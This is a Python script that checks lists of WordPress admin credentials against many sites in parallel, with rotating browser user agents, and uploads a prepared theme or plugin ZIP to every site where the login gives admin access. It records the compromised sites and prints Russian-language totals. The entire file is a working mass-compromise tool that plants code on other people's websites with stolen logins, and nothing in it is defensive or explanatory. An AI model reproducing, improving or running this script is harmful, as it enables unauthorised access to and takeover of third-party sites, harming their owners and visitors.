import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import threading
import os
import random

INPUT_FILE = "adm.txt"
GOOD_FILE = "good.txt"
THEME_ZIP = "cwork.zip"
PLUGIN_ZIP = "nodeinfo.zip"
THEME_NAME = "cwork"
PLUGIN_NAME = "nodeinfo"
MAX_THREADS = 100
TIMEOUT = 15

lock = threading.Lock()
stat_lock = threading.Lock()

total_admins = 0
total_theme_uploaded = 0
total_plugin_uploaded = 0

BAD_LOGIN_PATTERNS = [
    "incorrect", "неверн", "не вірн", "das eingegebene", "es incorrecto",
    "es incorrecta", "is incorrect", "erreur", "ist falsch", "is niet correct",
    "неправильн", "ошибка", "ошибк", "ungültig"
]

ADMIN_PATHS = [
    "/wp-admin/plugins.php",
    "/wp-admin/themes.php",
    "/wp-admin/users.php",
    "/wp-admin/options-general.php"
]

USERAGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
]

def get_random_headers():
    ua = random.choice(USERAGENTS)
    return {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

def is_bad_login(text):
    text = text.lower()
    return any(pat in text for pat in BAD_LOGIN_PATTERNS)

def is_real_admin(session, base_url, headers):
    for path in ADMIN_PATHS:
        url = f"{base_url}{path}"
        try:
            resp = session.get(url, timeout=TIMEOUT, allow_redirects=True, headers=headers)
            if resp.status_code == 200:
                if ('/wp-login.php' not in resp.url) and not is_bad_login(resp.text):
                    return True
        except Exception:
            continue
    return False

def get_wp_nonce(session, url, headers):
    try:
        resp = session.get(url, timeout=TIMEOUT, allow_redirects=True, headers=headers)
        if resp.status_code != 200:
            return None
        import re
        m = re.search(r'name="_wpnonce" value="([^"]+)"', resp.text)
        if m:
            return m.group(1)
    except Exception:
        pass
    return None

def upload_zip(session, base_url, wp_nonce, zip_path, upload_type, headers):
    if upload_type == "theme":
        upload_url = f"{base_url}/wp-admin/update.php?action=upload-theme"
        field = "themezip"
    else:
        upload_url = f"{base_url}/wp-admin/update.php?action=upload-plugin"
        field = "pluginzip"
    files = {field: (os.path.basename(zip_path), open(zip_path, "rb"), "application/zip")}
    data = {
        "_wpnonce": wp_nonce,
        "_wp_http_referer": f"/wp-admin/{'theme-install.php' if upload_type == 'theme' else 'plugin-install.php'}?upload",
    }
    try:
        resp = session.post(upload_url, files=files, data=data, timeout=TIMEOUT, allow_redirects=True, headers=headers)
    finally:
        files[field][1].close()
    return resp.status_code in (200, 302)

def check_theme_installed(session, base_url, headers):
    url = f"{base_url}/wp-admin/themes.php"
    try:
        resp = session.get(url, timeout=10, allow_redirects=True, headers=headers)
        if resp.status_code == 200:
            if THEME_NAME.lower() in resp.text.lower():
                return True
    except Exception:
        pass
    return False

def check_plugin_installed(session, base_url, headers):
    url = f"{base_url}/wp-admin/plugins.php"
    try:
        resp = session.get(url, timeout=10, allow_redirects=True, headers=headers)
        if resp.status_code == 200:
            if PLUGIN_NAME.lower() in resp.text.lower():
                return True
    except Exception:
        pass
    return False

def try_upload(session, base_url, headers):
    # 1. theme
    if os.path.exists(THEME_ZIP):
        url = f"{base_url}/wp-admin/theme-install.php?upload"
        nonce = get_wp_nonce(session, url, headers)
        if nonce:
            if upload_zip(session, base_url, nonce, THEME_ZIP, "theme", headers):
                if check_theme_installed(session, base_url, headers):
                    return "theme"
    # 2. plugin
    if os.path.exists(PLUGIN_ZIP):
        url = f"{base_url}/wp-admin/plugin-install.php?upload"
        nonce = get_wp_nonce(session, url, headers)
        if nonce:
            if upload_zip(session, base_url, nonce, PLUGIN_ZIP, "plugin", headers):
                if check_plugin_installed(session, base_url, headers):
                    return "plugin"
    return None

def check_wp_login(line):
    global total_admins, total_theme_uploaded, total_plugin_uploaded
    try:
        line = line.strip()
        if not line or ';' not in line:
            return None
        url, login, password = line.split(';', 2)
        session = requests.Session()
        headers = get_random_headers()
        resp = session.get(url, timeout=TIMEOUT, allow_redirects=True, headers=headers)
        if resp.status_code != 200 or is_bad_login(resp.text):
            return None
        from urllib.parse import urlparse
        parsed = urlparse(url)
        referer = url
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        redirect_to = f"{base_url}/wp-admin/"
        data = {
            "log": login,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": redirect_to,
            "testcookie": "1"
        }
        session.cookies.set('wordpress_test_cookie', 'WP+Cookie+check')
        login_headers = dict(headers)
        login_headers["Referer"] = referer
        resp2 = session.post(url, data=data, headers=login_headers, timeout=TIMEOUT, allow_redirects=True)
        if is_bad_login(resp2.text) or '/wp-admin/' not in resp2.url:
            return None
        if not is_real_admin(session, base_url, headers):
            return None
        with stat_lock:
            global total_admins
            total_admins += 1
        uploaded = try_upload(session, base_url, headers)
        if uploaded == "theme":
            with stat_lock:
                global total_theme_uploaded
                total_theme_uploaded += 1
            return f"{line} # theme_uploaded"
        elif uploaded == "plugin":
            with stat_lock:
                global total_plugin_uploaded
                total_plugin_uploaded += 1
            return f"{line} # plugin_uploaded"
        else:
            return line
    except Exception:
        return None

def main():
    with open(INPUT_FILE, encoding='utf-8') as f:
        lines = [line.rstrip('\n') for line in f if line.strip()]

    with open(GOOD_FILE, "a", encoding='utf-8') as good_file, \
            ThreadPoolExecutor(max_workers=MAX_THREADS) as executor, \
            tqdm(total=len(lines), desc="Checking", ncols=80) as pbar:
        futures = {executor.submit(check_wp_login, line): line for line in lines}
        for future in as_completed(futures):
            res = future.result()
            if res:
                with lock:
                    good_file.write(res + "\n")
                    good_file.flush()
            pbar.update(1)

    print("\n--- Статистика проверки ---")
    print(f"Всего валидных админов: {total_admins}")
    print(f"Успешно загружено тем:   {total_theme_uploaded}")
    print(f"Успешно загружено плагинов: {total_plugin_uploaded}")

if __name__ == "__main__":
    main()